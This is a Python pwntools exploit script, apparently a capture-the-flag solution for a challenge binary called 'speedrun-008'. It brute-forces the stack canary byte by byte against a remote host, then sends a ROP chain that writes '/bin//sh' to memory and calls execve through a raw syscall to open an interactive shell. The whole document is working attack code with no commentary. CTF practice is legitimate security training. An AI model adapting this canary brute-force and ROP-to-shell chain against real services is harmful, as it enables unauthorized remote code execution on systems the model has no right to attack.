from pwn import *
import time

# r = process("./speedrun-008")
# r.recv()

context.log_level = 'error'
payload = b'A'*1032
canary = bytes([0])
canary = bytes.fromhex("00ab096e6b1c1c2e") # local canary
canary = bytes.fromhex("00c95020314a5c1e") # remote canary
while len(canary) < 8:
	for i in range(256):
		# r = process("./speedrun-008")
		r = remote("172.17.0.10", 31337)
		r.recv()
		r.clean()
		r.send(payload+canary+bytes([i]))
		recvd = r.recv()
		print(recvd)
		if b"stack smashing" not in recvd:
			canary += bytes([i])
			print(f"CANARY: {canary.hex()}")
			break
context.log_level = 'info'
mov_rsi_rdi = 0x44704b
data_section = 0x6bc000
syscall = 0x4013bc

# r = process("./speedrun-008")
r = remote("172.17.0.10", 31337)
r.recv()
e = ELF("./speedrun-008")
context.binary = e
rop = ROP(e)
rop.raw(payload)
rop.raw(canary)
rop.raw("A"*8) # rsp
rop.raw(rop.rdi)
rop.raw(data_section)
rop.raw(rop.rsi)
rop.raw("/bin//sh")
rop.raw(mov_rsi_rdi)
rop.raw(rop.rsi)
rop.raw(0x0)
rop.raw(rop.rdx)
rop.raw(0x0)
rop.raw(rop.rax)
rop.raw(59)
rop.raw(syscall)
r.send(rop.chain())

r.interactive()